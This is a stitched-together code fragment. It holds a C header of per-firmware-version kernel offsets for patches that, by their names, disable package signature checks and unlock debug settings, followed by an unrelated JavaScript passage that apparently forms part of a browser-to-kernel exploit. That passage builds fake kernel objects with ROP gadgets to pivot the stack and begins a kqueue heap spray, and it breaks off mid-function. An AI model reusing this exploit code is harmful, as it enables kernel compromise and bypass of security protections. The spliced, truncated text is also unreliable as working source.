#define K405_SETLOGIN_PATCH  0x0
#define K406_SETLOGIN_PATCH  0x0
#define K407_SETLOGIN_PATCH  0x0
#define K450_SETLOGIN_PATCH  0x0
#define K455_SETLOGIN_PATCH  0x0
#define K470_SETLOGIN_PATCH  0x0
#define K471_SETLOGIN_PATCH  0x0
#define K472_SETLOGIN_PATCH  0x0
#define K473_SETLOGIN_PATCH  0x0
#define K474_SETLOGIN_PATCH  0x0011622C
#define K500_SETLOGIN_PATCH  0x0005775C
#define K501_SETLOGIN_PATCH  0x0005775C
#define K503_SETLOGIN_PATCH  0x0005775C
#define K505_SETLOGIN_PATCH  0x0005775C
#define K507_SETLOGIN_PATCH  0x0005775C
#define K550_SETLOGIN_PATCH  0x0001352C
#define K553_SETLOGIN_PATCH  0x0001352C
#define K555_SETLOGIN_PATCH  0x0001352C
#define K556_SETLOGIN_PATCH  0x0002BE6C
#define K600_SETLOGIN_PATCH  0x0002BE6C
#define K602_SETLOGIN_PATCH  0x0002BE6C
#define K620_SETLOGIN_PATCH  0x0002BE6C
#define K650_SETLOGIN_PATCH  0x0010E86C
#define K651_SETLOGIN_PATCH  0x0010E86C
#define K670_SETLOGIN_PATCH  0x0010EC1C
#define K671_SETLOGIN_PATCH  0x0010EC1C
#define K672_SETLOGIN_PATCH  0x0010EC1C
#define K700_SETLOGIN_PATCH  0x0008A8EC
#define K701_SETLOGIN_PATCH  0x0008A8EC
#define K702_SETLOGIN_PATCH  0x0008A8EC
#define K750_SETLOGIN_PATCH  0x0037CF6C
#define K751_SETLOGIN_PATCH  0x0037CF6C
#define K755_SETLOGIN_PATCH  0x0037CF6C
#define K800_SETLOGIN_PATCH  0x0035034C
#define K801_SETLOGIN_PATCH  0x0035034C
#define K803_SETLOGIN_PATCH  0x0035034C
#define K850_SETLOGIN_PATCH  0x0023208C
#define K852_SETLOGIN_PATCH  0x0023208C
#define K900_SETLOGIN_PATCH  0x000046BC
#define K903_SETLOGIN_PATCH  0x000046BC
#define K904_SETLOGIN_PATCH  0x000046BC
#define K950_SETLOGIN_PATCH  0x001FD1EC
#define K951_SETLOGIN_PATCH  0x001FD1EC
#define K960_SETLOGIN_PATCH  0x001FD1EC
#define K1000_SETLOGIN_PATCH 0x0026A40C
#define K1001_SETLOGIN_PATCH 0x0026A40C
#define K1050_SETLOGIN_PATCH 0x0008EE7C
#define K1070_SETLOGIN_PATCH 0x0008EE7C
#define K1071_SETLOGIN_PATCH 0x0008EE7C
#define K1100_SETLOGIN_PATCH 0x004341DC
#define K1102_SETLOGIN_PATCH 0x0043416C
#define K1150_SETLOGIN_PATCH 0x00393F5C
#define K1152_SETLOGIN_PATCH 0x00393F5C
#define K1200_SETLOGIN_PATCH 0x0039419C
#define K1202_SETLOGIN_PATCH 0x0039419C
#define K1250_SETLOGIN_PATCH 0x003941DC
#define K1252_SETLOGIN_PATCH 0x003941DC

#define K300_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K310_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K311_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K315_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K350_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K355_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K370_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K400_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K401_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K405_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K406_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K407_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K450_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K455_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K470_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K471_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K472_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K473_PFS_SIGNATURE_CHECK_PATCH  0x0
#define K474_PFS_SIGNATURE_CHECK_PATCH  0x006A2DF0
#define K500_PFS_SIGNATURE_CHECK_PATCH  0x006A2320
#define K501_PFS_SIGNATURE_CHECK_PATCH  0x006A2320
#define K503_PFS_SIGNATURE_CHECK_PATCH  0x006A26C0
#define K505_PFS_SIGNATURE_CHECK_PATCH  0x006A2700
#define K507_PFS_SIGNATURE_CHECK_PATCH  0x006A2700
#define K550_PFS_SIGNATURE_CHECK_PATCH  0x0069B2F0
#define K553_PFS_SIGNATURE_CHECK_PATCH  0x0069B1F0
#define K555_PFS_SIGNATURE_CHECK_PATCH  0x0069B730
#define K556_PFS_SIGNATURE_CHECK_PATCH  0x006A3750
#define K600_PFS_SIGNATURE_CHECK_PATCH  0x006A3750
#define K602_PFS_SIGNATURE_CHECK_PATCH  0x006A3750
#define K620_PFS_SIGNATURE_CHECK_PATCH  0x006A3C10
#define K650_PFS_SIGNATURE_CHECK_PATCH  0x006A7800
#define K651_PFS_SIGNATURE_CHECK_PATCH  0x006A7800
#define K670_PFS_SIGNATURE_CHECK_PATCH  0x006A8EB0
#define K671_PFS_SIGNATURE_CHECK_PATCH  0x006A8EB0
#define K672_PFS_SIGNATURE_CHECK_PATCH  0x006A8EB0
#define K700_PFS_SIGNATURE_CHECK_PATCH  0x006BE880
#define K701_PFS_SIGNATURE_CHECK_PATCH  0x006BE880
#define K702_PFS_SIGNATURE_CHECK_PATCH  0x006BE880
#define K750_PFS_SIGNATURE_CHECK_PATCH  0x006DD970
#define K751_PFS_SIGNATURE_CHECK_PATCH  0x006DD9A0
#define K755_PFS_SIGNATURE_CHECK_PATCH  0x006DD9A0
#define K800_PFS_SIGNATURE_CHECK_PATCH  0x00681DD0
#define K801_PFS_SIGNATURE_CHECK_PATCH  0x00681DD0
#define K803_PFS_SIGNATURE_CHECK_PATCH  0x00681DD0
#define K850_PFS_SIGNATURE_CHECK_PATCH  0x00683F40
#define K852_PFS_SIGNATURE_CHECK_PATCH  0x00683F40
#define K900_PFS_SIGNATURE_CHECK_PATCH  0x006885C0
#define K903_PFS_SIGNATURE_CHECK_PATCH  0x00686580
#define K904_PFS_SIGNATURE_CHECK_PATCH  0x00686580
#define K950_PFS_SIGNATURE_CHECK_PATCH  0x006AAC00
#define K951_PFS_SIGNATURE_CHECK_PATCH  0x006AAC00
#define K960_PFS_SIGNATURE_CHECK_PATCH  0x006AAC00
#define K1000_PFS_SIGNATURE_CHECK_PATCH 0x006926E0
#define K1001_PFS_SIGNATURE_CHECK_PATCH 0x006926E0
#define K1050_PFS_SIGNATURE_CHECK_PATCH 0x006C4C00
#define K1070_PFS_SIGNATURE_CHECK_PATCH 0x006C4C00
#define K1071_PFS_SIGNATURE_CHECK_PATCH 0x006C4C00
#define K1100_PFS_SIGNATURE_CHECK_PATCH 0x00684EB0
#define K1102_PFS_SIGNATURE_CHECK_PATCH 0x00684E50
#define K1150_PFS_SIGNATURE_CHECK_PATCH 0x0069D550
#define K1152_PFS_SIGNATURE_CHECK_PATCH 0x0069D550
#define K1200_PFS_SIGNATURE_CHECK_PATCH 0x0069D9A0
#define K1202_PFS_SIGNATURE_CHECK_PATCH 0x0069D9A0
#define K1250_PFS_SIGNATURE_CHECK_PATCH 0x0069DA40
#define K1252_PFS_SIGNATURE_CHECK_PATCH 0x0069DA40

#define K300_DEBUG_RIF_PATCH_1  0x0
#define K310_DEBUG_RIF_PATCH_1  0x0
#define K311_DEBUG_RIF_PATCH_1  0x0
#define K315_DEBUG_RIF_PATCH_1  0x0
#define K350_DEBUG_RIF_PATCH_1  0x0
#define K355_DEBUG_RIF_PATCH_1  0x0
#define K370_DEBUG_RIF_PATCH_1  0x0
#define K400_DEBUG_RIF_PATCH_1  0x0
#define K401_DEBUG_RIF_PATCH_1  0x0
#define K405_DEBUG_RIF_PATCH_1  0x0
#define K406_DEBUG_RIF_PATCH_1  0x0
#define K407_DEBUG_RIF_PATCH_1  0x0
#define K450_DEBUG_RIF_PATCH_1  0x0
#define K455_DEBUG_RIF_PATCH_1  0x0
#define K470_DEBUG_RIF_PATCH_1  0x0
#define K471_DEBUG_RIF_PATCH_1  0x0
#define K472_DEBUG_RIF_PATCH_1  0x0
#define K473_DEBUG_RIF_PATCH_1  0x0
#define K474_DEBUG_RIF_PATCH_1  0x00630B10
#define K500_DEBUG_RIF_PATCH_1  0x0064AED0
#define K501_DEBUG_RIF_PATCH_1  0x0064AED0
#define K503_DEBUG_RIF_PATCH_1  0x0064B270
#define K505_DEBUG_RIF_PATCH_1  0x0064B2B0
#define K507_DEBUG_RIF_PATCH_1  0x0064B2B0
#define K550_DEBUG_RIF_PATCH_1  0x00665660
#define K553_DEBUG_RIF_PATCH_1  0x00665560
#define K555_DEBUG_RIF_PATCH_1  0x00665AA0
#define K556_DEBUG_RIF_PATCH_1  0x00667900
#define K600_DEBUG_RIF_PATCH_1  0x00667900
#define K602_DEBUG_RIF_PATCH_1  0x00667900
#define K620_DEBUG_RIF_PATCH_1  0x00667DC0
#define K650_DEBUG_RIF_PATCH_1  0x006698A0
#define K651_DEBUG_RIF_PATCH_1  0x006698A0
#define K670_DEBUG_RIF_PATCH_1  0x0066AEB0
#define K671_DEBUG_RIF_PATCH_1  0x0066AEB0
#define K672_DEBUG_RIF_PATCH_1  0x0066AEB0
#define K700_DEBUG_RIF_PATCH_1  0x00668270
#define K701_DEBUG_RIF_PATCH_1  0x00668270
#define K702_DEBUG_RIF_PATCH_1  0x00668270
#define K750_DEBUG_RIF_PATCH_1  0x00668140
#define K751_DEBUG_RIF_PATCH_1  0x00668140
#define K755_DEBUG_RIF_PATCH_1  0x00668140
#define K800_DEBUG_RIF_PATCH_1  0x0064DF00
#define K801_DEBUG_RIF_PATCH_1  0x0064DF00
#define K803_DEBUG_RIF_PATCH_1  0x0064DF00
#define K850_DEBUG_RIF_PATCH_1  0x0064DC60
#define K852_DEBUG_RIF_PATCH_1  0x0064DC60
#define K900_DEBUG_RIF_PATCH_1  0x00650430
#define K903_DEBUG_RIF_PATCH_1  0x0064E3F0
#define K904_DEBUG_RIF_PATCH_1  0x0064E3F0
#define K950_DEBUG_RIF_PATCH_1  0x00643EA0
#define K951_DEBUG_RIF_PATCH_1  0x00643EA0
#define K960_DEBUG_RIF_PATCH_1  0x00643EA0
#define K1000_DEBUG_RIF_PATCH_1 0x0064A510
#define K1001_DEBUG_RIF_PATCH_1 0x0064A510
#define K1050_DEBUG_RIF_PATCH_1 0x0064E930
#define K1070_DEBUG_RIF_PATCH_1 0x0064E930
#define K1071_DEBUG_RIF_PATCH_1 0x0064E930
#define K1100_DEBUG_RIF_PATCH_1 0x0064BFD0
#define K1102_DEBUG_RIF_PATCH_1 0x0064BF70
#define K1150_DEBUG_RIF_PATCH_1 0x0064E8F0
#define K1152_DEBUG_RIF_PATCH_1 0x0064E8F0
#define K1200_DEBUG_RIF_PATCH_1 0x0064EB30
#define K1202_DEBUG_RIF_PATCH_1 0x0064EB30
#define K1250_DEBUG_RIF_PATCH_1 0x0064EBD0
#define K1252_DEBUG_RIF_PATCH_1 0x0064EBD0

#define K300_DEBUG_RIF_PATCH_2  0x0
#define K310_DEBUG_RIF_PATCH_2  0x0
#define K311_DEBUG_RIF_PATCH_2  0x0
#define K315_DEBUG_RIF_PATCH_2  0x0
#define K350_DEBUG_RIF_PATCH_2  0x0
#define K355_DEBUG_RIF_PATCH_2  0x0
#define K370_DEBUG_RIF_PATCH_2  0x0
#define K400_DEBUG_RIF_PATCH_2  0x0
#define K401_DEBUG_RIF_PATCH_2  0x0
#define K405_DEBUG_RIF_PATCH_2  0x0
#define K406_DEBUG_RIF_PATCH_2  0x0
#define K407_DEBUG_RIF_PATCH_2  0x0
#define K450_DEBUG_RIF_PATCH_2  0x0
#define K455_DEBUG_RIF_PATCH_2  0x0
#define K470_DEBUG_RIF_PATCH_2  0x0
#define K471_DEBUG_RIF_PATCH_2  0x0
#define K472_DEBUG_RIF_PATCH_2  0x0
#define K473_DEBUG_RIF_PATCH_2  0x0
#define K474_DEBUG_RIF_PATCH_2  0x00630B30
#define K500_DEBUG_RIF_PATCH_2  0x0064AEF0
#define K501_DEBUG_RIF_PATCH_2  0x0064AEF0
#define K503_DEBUG_RIF_PATCH_2  0x0064B290
#define K505_DEBUG_RIF_PATCH_2  0x0064B2D0
#define K507_DEBUG_RIF_PATCH_2  0x0064B2D0
#define K550_DEBUG_RIF_PATCH_2  0x00665690
#define K553_DEBUG_RIF_PATCH_2  0x00665590
#define K555_DEBUG_RIF_PATCH_2  0x00665AD0
#define K556_DEBUG_RIF_PATCH_2  0x00667930
#define K600_DEBUG_RIF_PATCH_2  0x00667930
#define K602_DEBUG_RIF_PATCH_2  0x00667930
#define K620_DEBUG_RIF_PATCH_2  0x00667DF0
#define K650_DEBUG_RIF_PATCH_2  0x006698D0
#define K651_DEBUG_RIF_PATCH_2  0x006698D0
#define K670_DEBUG_RIF_PATCH_2  0x0066AEE0
#define K671_DEBUG_RIF_PATCH_2  0x0066AEE0
#define K672_DEBUG_RIF_PATCH_2  0x0066AEE0
#define K700_DEBUG_RIF_PATCH_2  0x006682A0
#define K701_DEBUG_RIF_PATCH_2  0x006682A0
#define K702_DEBUG_RIF_PATCH_2  0x006682A0
#define K750_DEBUG_RIF_PATCH_2  0x00668170
#define K751_DEBUG_RIF_PATCH_2  0x00668170
#define K755_DEBUG_RIF_PATCH_2  0x00668170
#define K800_DEBUG_RIF_PATCH_2  0x0064DF30
#define K801_DEBUG_RIF_PATCH_2  0x0064DF30
#define K803_DEBUG_RIF_PATCH_2  0x0064DF30
#define K850_DEBUG_RIF_PATCH_2  0x0064DC90
#define K852_DEBUG_RIF_PATCH_2  0x0064DC90
#define K900_DEBUG_RIF_PATCH_2  0x00650460
#define K903_DEBUG_RIF_PATCH_2  0x0064E420
#define K904_DEBUG_RIF_PATCH_2  0x0064E420
#define K950_DEBUG_RIF_PATCH_2  0x00643ED0
#define K951_DEBUG_RIF_PATCH_2  0x00643ED0
#define K960_DEBUG_RIF_PATCH_2  0x00643ED0
#define K1000_DEBUG_RIF_PATCH_2 0x0064A540
#define K1001_DEBUG_RIF_PATCH_2 0x0064A540
#define K1050_DEBUG_RIF_PATCH_2 0x0064E960
#define K1070_DEBUG_RIF_PATCH_2 0x0064E960
#define K1071_DEBUG_RIF_PATCH_2 0x0064E960
#define K1100_DEBUG_RIF_PATCH_2 0x0064C000
#define K1102_DEBUG_RIF_PATCH_2 0x0064BFA0
#define K1150_DEBUG_RIF_PATCH_2 0x0064E920
#define K1152_DEBUG_RIF_PATCH_2 0x0064E920
#define K1200_DEBUG_RIF_PATCH_2 0x0064EB60
#define K1202_DEBUG_RIF_PATCH_2 0x0064EB60
#define K1250_DEBUG_RIF_PATCH_2 0x0064EC00
#define K1252_DEBUG_RIF_PATCH_2 0x0064EC00

#define K300_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K310_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K311_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K315_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K350_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K355_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K370_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K400_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K401_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K405_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K406_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K407_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K450_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K455_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K470_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K471_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K472_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K473_DEBUG_SETTINGS_ERROR_PATCH_1  0x0
#define K474_DEBUG_SETTINGS_ERROR_PATCH_1  0x004D8777
#define K500_DEBUG_SETTINGS_ERROR_PATCH_1  0x004F8C78
#define K501_DEBUG_SETTINGS_ERROR_PATCH_1  0x004F8C78
#define K503_DEBUG_SETTINGS_ERROR_PATCH_1  0x004F9008
#define K505_DEBUG_SETTINGS_ERROR_PATCH_1  0x004F9048
#define K507_DEBUG_SETTINGS_ERROR_PATCH_1  0x004F9048
#define K550_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050959E
#define K553_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050949E
#define K555_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050985E
#define K556_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050254E
#define K600_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050254E
#define K602_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050254E
#define K620_DEBUG_SETTINGS_ERROR_PATCH_1  0x0050256E
#define K650_DEBUG_SETTINGS_ERROR_PATCH_1  0x00507759
#define K651_DEBUG_SETTINGS_ERROR_PATCH_1  0x00507759
#define K670_DEBUG_SETTINGS_ERROR_PATCH_1  0x00507B09
#define K671_DEBUG_SETTINGS_ERROR_PATCH_1  0x00507B09
#define K672_DEBUG_SETTINGS_ERROR_PATCH_1  0x00507B09
#define K700_DEBUG_SETTINGS_ERROR_PATCH_1  0x005016FA
#define K701_DEBUG_SETTINGS_ERROR_PATCH_1  0x005016FA
#define K702_DEBUG_SETTINGS_ERROR_PATCH_1  0x005016FA
#define K750_DEBUG_SETTINGS_ERROR_PATCH_1  0x004FF322
#define K751_DEBUG_SETTINGS_ERROR_PATCH_1  0x004FF322
#define K755_DEBUG_SETTINGS_ERROR_PATCH_1  0x004FF322
#define K800_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E45D8
#define K801_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E45D8
#define K803_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E45D8
#define K850_DEBUG_SETTINGS_ERROR_PATCH_1  0x004EA0F8
#define K852_DEBUG_SETTINGS_ERROR_PATCH_1  0x004EA0F8
#define K900_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E8E48
#define K903_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E6D48
#define K904_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E6D48
#define K950_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E9038
#define K951_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E9038
#define K960_DEBUG_SETTINGS_ERROR_PATCH_1  0x004E9038
#define K1000_DEBUG_SETTINGS_ERROR_PATCH_1 0x004EC908
#define K1001_DEBUG_SETTINGS_ERROR_PATCH_1 0x004EC908
#define K1050_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E6DA8
#define K1070_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E6DA8
#define K1071_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E6DA8
#define K1100_DEBUG_SETTINGS_ERROR_PATCH_1 0x004EE328
#define K1102_DEBUG_SETTINGS_ERROR_PATCH_1 0x004EE2B8
#define K1150_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E8508
#define K1152_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E8508
#define K1200_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E8748
#define K1202_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E8748
#define K1250_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E8788
#define K1252_DEBUG_SETTINGS_ERROR_PATCH_1 0x004E8788

#define K300_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K310_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K311_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K315_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K350_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K355_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K370_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K400_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K401_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K405_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K406_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K407_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K450_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K455_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K470_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K471_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K472_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K473_DEBUG_SETTINGS_ERROR_PATCH_2  0x0
#define K474_DEBUG_SETTINGS_ERROR_PATCH_2  0x004D9601
#define K500_DEBUG_SETTINGS_ERROR_PATCH_2  0x004F9D8C
#define K501_DEBUG_SETTINGS_ERROR_PATCH_2  0x004F9D8C
#define K503_DEBUG_SETTINGS_ERROR_PATCH_2  0x004FA11C
#define K505_DEBUG_SETTINGS_ERROR_PATCH_2  0x004FA15C
#define K507_DEBUG_SETTINGS_ERROR_PATCH_2  0x004FA15C
#define K550_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050A86C
#define K553_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050A76C
#define K555_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050AB2C
#define K556_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050380C
#define K600_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050380C
#define K602_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050380C
#define K620_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050382C
#define K650_DEBUG_SETTINGS_ERROR_PATCH_2  0x005089AC
#define K651_DEBUG_SETTINGS_ERROR_PATCH_2  0x005089AC
#define K670_DEBUG_SETTINGS_ERROR_PATCH_2  0x00508D5C
#define K671_DEBUG_SETTINGS_ERROR_PATCH_2  0x00508D5C
#define K672_DEBUG_SETTINGS_ERROR_PATCH_2  0x00508D5C
#define K700_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050296C
#define K701_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050296C
#define K702_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050296C
#define K750_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050059C
#define K751_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050059C
#define K755_DEBUG_SETTINGS_ERROR_PATCH_2  0x0050059C
#define K800_DEBUG_SETTINGS_ERROR_PATCH_2  0x004E584C
#define K801_DEBUG_SETTINGS_ERROR_PATCH_2  0x004E584C
#define K803_DEBUG_SETTINGS_ERROR_PATCH_2  0x004E584C
#define K850_DEBUG_SETTINGS_ERROR_PATCH_2  0x004EB36C
#define K852_DEBUG_SETTINGS_ERROR_PATCH_2  0x004EB36C
#define K900_DEBUG_SETTINGS_ERROR_PATCH_2  0x004EA12F
#define K903_DEBUG_SETTINGS_ERROR_PATCH_2  0x004E802F
#define K904_DEBUG_SETTINGS_ERROR_PATCH_2  0x004E802F
#define K950_DEBUG_SETTINGS_ERROR_PATCH_2  0x004EA06F
#define K951_DEBUG_SETTINGS_ERROR_PATCH_2  0x004EA06F
#define K960_DEBUG_SETTINGS_ERROR_PATCH_2  0x004EA06F
#define K1000_DEBUG_SETTINGS_ERROR_PATCH_2 0x004ED9CE
#define K1001_DEBUG_SETTINGS_ERROR_PATCH_2 0x004ED9CE
#define K1050_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E7E6E
#define K1070_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E7E6E
#define K1071_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E7E6E
#define K1100_DEBUG_SETTINGS_ERROR_PATCH_2 0x004EF3EE
#define K1102_DEBUG_SETTINGS_ERROR_PATCH_2 0x004EF37E
#define K1150_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E95CE
#define K1152_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E95CE
#define K1200_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E980E
#define K1202_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E980E
#define K1250_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E984E
#define K1252_DEBUG_SETTINGS_ERROR_PATCH_2 0x004E984E

#define K300_DEPTH_LIMIT_PATCH  0x0
#define K310_DEPTH_LIMIT_PATCH  0x0
#define K311_DEPTH_LIMIT_PATCH  0x0
#define K315_DEPTH_LIMIT_PATCH  0x0
#define K350_DEPTH_LIMIT_PATCH  0x0
#define K355_DEPTH_LIMIT_PATCH  0x0
#define K370_DEPTH_LIMIT_PATCH  0x0
#define K400_DEPTH_LIMIT_PATCH  0x0
#define K401_DEPTH_LIMIT_PATCH  0x0
#define K405_DEPTH_LIMIT_PATCH  0x0
#define K406_DEPTH_LIMIT_PATCH  0x0
#define K407_DEPTH_LIMIT_PATCH  0x0
#define K450_DEPTH_LIMIT_PATCH  0x0
#define K455_DEPTH_LIMIT_PATCH  0x0
#define K470_DEPTH_LIMIT_PATCH  0x0
#define K471_DEPTH_LIMIT_PATCH  0x0
#define K472_DEPTH_LIMIT_PATCH  0x0
#define K473_DEPTH_LIMIT_PATCH  0x0
#define K474_DEPTH_LIMIT_PATCH  0x003EA302
#define K500_DEPTH_LIMIT_PATCH  0x00050812
#define K501_DEPTH_LIMIT_PATCH  0x00050812
#define K503_DEPTH_LIMIT_PATCH  0x00050812
#define K505_DEPTH_LIMIT_PATCH  0x00050812
#define K507_DEPTH_LIMIT_PATCH  0x00050812
#define K550_DEPTH_LIMIT_PATCH  0x00491CDE
#define K553_DEPTH_LIMIT_PATCH  0x00491BDE
#define K555_DEPTH_LIMIT_PATCH  0x00491F9E
#define K556_DEPTH_LIMIT_PATCH  0x00397B0E
#define K600_DEPTH_LIMIT_PATCH  0x00397B0E
#define K602_DEPTH_LIMIT_PATCH  0x00397B0E
#define K620_DEPTH_LIMIT_PATCH  0x00397B2E
#define K650_DEPTH_LIMIT_PATCH  0x002D22A6
#define K651_DEPTH_LIMIT_PATCH  0x002D22A6
#define K670_DEPTH_LIMIT_PATCH  0x002D2656
#define K671_DEPTH_LIMIT_PATCH  0x002D2656
#define K672_DEPTH_LIMIT_PATCH  0x002D2656
#define K700_DEPTH_LIMIT_PATCH  0x002761C6
#define K701_DEPTH_LIMIT_PATCH  0x002761C6
#define K702_DEPTH_LIMIT_PATCH  0x002761C6
#define K750_DEPTH_LIMIT_PATCH  0x0031A8F6
#define K751_DEPTH_LIMIT_PATCH  0x0031A8F6
#define K755_DEPTH_LIMIT_PATCH  0x0031A8F6
#define K800_DEPTH_LIMIT_PATCH  0x0001B0B6
#define K801_DEPTH_LIMIT_PATCH  0x0001B0B6
#define K803_DEPTH_LIMIT_PATCH  0x0001B0B6
#define K850_DEPTH_LIMIT_PATCH  0x00164E36
#define K852_DEPTH_LIMIT_PATCH  0x00164E36
#define K900_DEPTH_LIMIT_PATCH  0x003AB706
#define K903_DEPTH_LIMIT_PATCH  0x003A9906
#define K904_DEPTH_LIMIT_PATCH  0x003A9906
#define K950_DEPTH_LIMIT_PATCH  0x00115EE6
#define K951_DEPTH_LIMIT_PATCH  0x00115EE6
#define K960_DEPTH_LIMIT_PATCH  0x00115EE6
#define K1000_DEPTH_LIMIT_PATCH 0x00450E56
#define K1001_DEPTH_LIMIT_PATCH 0x00450E56
#define K1050_DEPTH_LIMIT_PATCH 0x000DAA46
#define K1070_DEPTH_LIMIT_PATCH 0x000DAA46
#define K1071_DEPTH_LIMIT_PATCH 0x000DAA46
#define K1100_DEPTH_LIMIT_PATCH 0x0028FF26
#define K1102_DEPTH_LIMIT_PATCH 0x0028FF46
#define K1150_DEPTH_LIMIT_PATCH 0x00030F66
#define K1152_DEPTH_LIMIT_PATCH 0x00030F66
#define K1200_DEPTH_LIMIT_PATCH 0x00030F66
#define K1202_DEPTH_LIMIT_PATCH 0x00030F66
#define K1250_DEPTH_LIMIT_PATCH 0x00030F66
#define K1252_DEPTH_LIMIT_PATCH 0x00030F66

// clang-format on

#endif
}

            function object_setup() {
                var fake_knote = chain.syscall(
                    477,
                    0x4000,
                    0x4000 * 0x3,
                    0x3,
                    0x1010,
                    0xffffffff,
                    0x0
                );
                var fake_filtops = fake_knote.add32(0x4000);
                var fake_obj = fake_knote.add32(0x8000);
                if (fake_knote.low != 0x4000) {
                    alert('enomem: ' + fake_knote);
                    while (1);
                }
                {
                    p.write8(fake_knote, fake_obj);
                    p.write8(fake_knote.add32(0x68), fake_filtops);
                }
                {
                    p.write8(fake_filtops.sub32(0x79), gadgets['cli ; pop rax']);
                    p.write8(
                        fake_filtops.add32(0x0),
                        gadgets['xchg rdi, rsp ; call [rsi - 0x79]']
                    );
                    p.write8(fake_filtops.add32(0x8), kchain.stack);
                    p.write8(
                        fake_filtops.add32(0x10),
                        gadgets['mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]']
                    );
                }
                {
                    p.write8(
                        fake_obj.add32(0x30),
                        gadgets['mov rdi, [rax + 8] ; call [rax]']
                    );
                }
                chain.syscall(203, fake_knote, 0xc000);
            }

            var trigger_spray = function () {
                var NUM_KQUEUES = 0x1b0;
                var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
                {
                    for (var i = 0; i < NUM_KQUEUES; i++) {
                        chain.fcall(window.syscalls[362]);
                        chain.write_result4(kqueue_ptr.add32(0x4 * i));
                    }
                }
                chain.run();
                var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
